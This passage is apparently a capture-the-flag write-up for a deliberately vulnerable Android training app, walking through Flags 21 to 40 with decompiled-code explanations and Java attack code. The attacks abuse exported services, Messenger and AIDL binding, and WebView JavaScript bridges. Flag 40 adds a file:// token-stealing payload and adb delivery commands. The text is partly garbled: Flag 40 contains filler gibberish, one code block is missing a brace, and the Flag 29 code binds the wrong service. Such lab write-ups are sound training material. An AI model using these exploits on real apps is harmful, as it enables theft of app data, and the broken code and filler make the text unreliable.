                String flag = intent.getStringExtra("flag");
                Log.d("flag21", flag);
            }
        };
        registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.GIVE_FLAG"));
    }
```

### Flag24
![](./images/Intent-Attack-Surface-img-42.png)
The above code is from flag24 provider 
![](./images/Intent-Attack-Surface-img-43.png)
The above code is from flag24activity
From the jadx code we can understand that the target app responds to an action io.hextree.services.START_FLAG24_SERVICE and if the action is same it implements the success method and in the method we can see its sending intent to flag 24 activity  
And the flag 24 activity receives it and checks weather it got the correct extras which is secret and if its true it calls the success method
The attack code used was 
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");
        intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
        startService(intent);
    }
```
### Flag25
Services are also similar to methods of intents and broadcasts 
![](./images/Intent-Attack-Surface-img-44.png)
The above code represents the flag25 service class in which we can observe its a three lock system if lock 1 unlocks checking if the action that came through intent is equal to desired action then unlock similarly all other 3 locks at last call the success function
In the success function we send the proofs that lock2 and lock3 are unlocked and we send a string secret
![](./images/Intent-Attack-Surface-img-45.png)
This above code represents the flga25 activity and it checks for the locks and secret string we have passed through intent and calls the success function
```java
 @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
        intent.setAction("io.hextree.services.UNLOCK1");
        startService(intent);
        intent.setAction("io.hextree.services.UNLOCK2");
        startService(intent);
        intent.setAction("io.hextree.services.UNLOCK3");
        startService(intent);
    }
```
### Flag 26
![](./images/Intent-Attack-Surface-img-46.png)
The below code represents the flag 26 service
The first we have to check for a service is weather its bounded or not bounded by checking onbind method if it returns something its bindable and able to bind to other apps if it returns null its not boundable 
The onbinder returns a ibinder object in this case ibinder acts as a messenger where we can actually pass data between two apps 
The incominghandler is a subclass of Handler that implements the handleMessage() method.
The looper acts a delivery boy checking for the messages and giving them back to the app to other apps
In this challenge the app is waiting for a message that contains 42 to call the success method which also contains few extras that are provided by service activity directly to flag26 activity to call the success method that prints the flag
```java
private Messenger serviceMessenger;
private ServiceConnection connection = new ServiceConnection() {

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            //create messenger 
            serviceMessenger = new Messenger(service);
            //create message
            Message message = Message.obtain(null, 42);
            //send message
            serviceMessenger.send(message);

        @Override
        public void onServiceDisconnected(ComponentName name) {
            serviceMessenger = null;
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag26Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }
```
so we have to make our attack app to send a message 
we create a service connection and messenger and send the code 42 which is expecting fro us by the code and send the message the target receives as message.what we set the target where our message is intened to go and we use bindservice and send out target class, the message, 
What is BIND_AUTO_CREATE?
BIND_AUTO_CREATE is an integer flag (usually 1) passed during the bindService() call.
Purpose: It ensures the Service is instantiated (created) if it isn't already running.
Lifecycle: When you use this flag, the Service goes through its onCreate() phase before returning the IBinder to you.
Management: As long as your app stays "Bound" to it, Android will try to keep that Service alive. Once you call unbindService() (or your app closes), if nothing else is using the Service, the System will automatically shut it down to save battery.
What is message.obtain()?
In normal cases we use new key word to create objects but in the case of message we reuse them using .obtain method

### Flag27
The below code represents flag27 service
![](./images/Intent-Attack-Surface-img-47.png)
As we can see there are 3 integer values 1,2,3 & 2 strings echo and password initially set to null 
The code is waiting for a message that contains the values that are needed to call the success method 
We can not only pass integers with messages but we can pass bundles and other data sets too as we can see the logic to reach the success we will implement the same method in our attack app 
This code applies a 3 way logic 
Step 1: We knock the door using bind service and make our connection using service connection 
Step2: We send the values : integer 1 and this creates a echo variable and stores the information we give through our sent bundle 
so we create a bundle containing give-flag string with the label echo
Step3: We send the integer 2 and app checks it and generates a random uuid and saves it to password in the apps memory and also sends it back 
so we have to create a receiver that can read the password it gives us 
Step4: the final check we send integer 3 and then we send back the password we got from the back because it checks for the password which we send and that is stored in apps storage and the echo variable too and finally call the success function
```java
 private Messenger serviceMessenger;
    //receives the password that is sent from the flag26service
    private final Messenger clientMessenger = new Messenger(new Handler(Looper.getMainLooper()) {
        @Override
        public void handleMessage(@NonNull Message msg) {
            if (msg.what == 2) {
                String password = msg.getData().getString("password");
                try {
                    //sends the password to flag26 service again & the integer 3
                    Message msg3 = Message.obtain(null, 3);
                    Bundle data3 = new Bundle();
                    data3.putString("password", password);
                    msg3.setData(data3);
                    serviceMessenger.send(msg3);
                } catch (RemoteException e) {
                    e.printStackTrace();
                }
            }
        }
    });

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            serviceMessenger = new Messenger(service);

            try {
                //The first pass
                Message msg1 = Message.obtain(null, 1);
                Bundle data1 = new Bundle();
                data1.putString("echo", "give flag");
                msg1.setData(data1);
                serviceMessenger.send(msg1);
                //sets adress where to send the password
                Message msg2 = Message.obtain(null, 2);
                msg2.replyTo = clientMessenger; // We give them our "Return Address"
                serviceMessenger.send(msg2);

            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            serviceMessenger = null;
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag27Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }
```

### Flag 28 
AIDL - Android Interface Definition Language
AIDL is used when the server and the client are in different apps for IPC(inter process communication) 
If an app is using aidl the attack surface increases because we should let other apps to implement the functions and we have to set the exported to true 
This challenge uses aidl language which we can confirm by the service class using stub method even though it uses stub method and you still have a doubt jump to interface class in which the stub method is being implemented if the variables are declared with TRANSACTION_ then its aidl file for sure
In this challenge there is nothing to do with the service or activity classes all you need is the stub class 
![](./images/Intent-Attack-Surface-img-48.png)
The challenge provider says which ever function throws RemoteException is the function that is being implemented 
aidl is a language it looks like java it is placed in .aidl file, aidl file is translated to java code while complilation we can see it java generated files after build
we need to be very specific about the class name and the package name and the order of the functions that are being called else the app will simply wont work 
The solution for this case is dynamic class loading

I didnt use dynamic class loading so my attack code is 
```java
private IFlag28Interface remoteService;
private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            remoteService = IFlag28Interface.Stub.asInterface(service);
            try {
                remoteService.openflag();
            } catch (Exception e) { }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            remoteService = null;
        }
    };
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag28Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }
}
```
The challenge says change options in build.gradle to set `buildFeatures {aidl = true}` else it will throw an error 
![](./images/Intent-Attack-Surface-img-49.png)
After creating our aidl file create another project which has the exact name mentioned in the DESCRIPTOR and the move our file into the package we created and change the package name in the code
Then finally make a connection import the interface class and call the function openflag() 
```java
// IFlag28Interface.aidl
package io.hextree.attacksurface.services;
interface IFlag28Interface {
    boolean openflag();
    }
```


### Flag 29
This challenge is similar to previous one except there are more than one functions and we can know their order by the TRANSACTION_ id’s and place them in the same order in our aidl file too
![](./images/Intent-Attack-Surface-img-50.png)
The above screen shot gives us the order of the function
![](./images/Intent-Attack-Surface-img-51.png)
The above screen shot we can see that we are creating a string and passing that in parcel2.writestring() function which is authenticated by authenticate() function and finally calls sucess if there is no clash
```java
public class flag29 extends AppCompatActivity {
    private IFlag29Interface aidlService;
    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            // Convert IBinder into AIDL interface
            aidlService = IFlag29Interface.Stub.asInterface(service);
            try {
                String password = aidlService.init();
                aidlService.authenticate(password);
                aidlService.success();
            } catch (Exception e) { }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            aidlService = null;
        }
    };
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag28Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }
}
```
We make a IFlag29Interface in the same method we made our IFlag28Interface and give the exact order of the functions 
```java
// IFlag29Interface.aidl
package io.hextree.attacksurface.services;
interface IFlag29Interface {
    String init();
    void authenticate(String str);
    void success();
}
```

### Flag 38
There are few apps that can be completely build on html and java script 
The functions that are annotated with **@**JavaScriptInterface allows the java objects methods to be accessed from java script
![](./images/Intent-Attack-Surface-img-52.png)
as usual we need to call the success function and we can see the app is waiting for an intent which contains a string labelled as URL which is used to load in webview() which we previously created an element webview
In the code we can see that java script is enabled which gives us a large range of attack surface because it contains functions and methods that are needed to be implemented and access to folders in some cases if its set to false and use only standard html the attack range would decrease drastically 
Using the java script we are creating a new object which has 2 methods in which one has success function
Back in Android 4, it was possible to use the JavascriptInterface to access any other Java object and call arbitrary methods. Leading to arbitrary code execution.
But in modern WebView this does not work anymore. Only methods annotated with `@JavascriptInterface` can be accessed.
![](./images/Intent-Attack-Surface-img-53.png)
When there is not intent there is a default url path is being loaded which loads he above html file
The above html file is in assets folder of decompiled code which is used for flag38 
There are 2 buttons executing functions since success is set to false
I used data uri’s for this case with content text/html and anything that is after that is a html document and we can even create payloads using scripts in this we set the success function to true and then send it as a intent which loads and calls success function
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface",
                "io.hextree.attacksurface.webviews.Flag38WebViewsActivity");
        intent.putExtra("URL", "data:text/html,<script>hextree.success(true)</script>");
        startActivity(intent);
    
```
### Flag 39
In this challenge the url is hardcoded so we cannot control the url 
![](./images/Intent-Attack-Surface-img-54.png)
As expected the app is expecting an intent labelled as NAME and when its not present the default name is neo
we are creating a json object and there is a function webView.evaluateJavascript() which means there is java script function that is being evaluated there in the webview specifically calls 
![](./images/Intent-Attack-Surface-img-55.png)
The success method in flag39 is called when the uuid generated in flag39webviews which is passed through intents 
We could pass the name through intents and our name it creates a java object and displays it in html 
In java code they created a bridge for java code to interact with javascript naming its as hextree
so we can interact with it using hextree.javascriptfunction()
![](./images/Intent-Attack-Surface-img-56.png)
so we create an intent which has a javascript function success 
since we can mangle with intent which reads name we make a intent which contains the
 `</b><script>hextree.success()</script>`  where the java script function is mentioned in script tags and \</b\>  closes the object name tag and executes ours  

### Flag40
hsdgh

sdsk
![](./images/Intent-Attack-Surface-img-57.png)
asjahjsj
```java
<html>
<body>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "file:///data/data/io.hextree.attacksurface/files/token.txt", true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                var token = xhr.responseText.trim();
                hextree.authCallback(token);
            }
        };
        xhr.send();
    </script>
</body>
</html>
```
shsdsjh
`adb push attack.html /sdcard/attack.html`
ashasnjds
`adb shell am start -n io.hextree.attacksurface/io.hextree.attacksurface.webviews.Flag40WebViewsActivity \
--es "URL" "file:///sdcard/attack.html"`
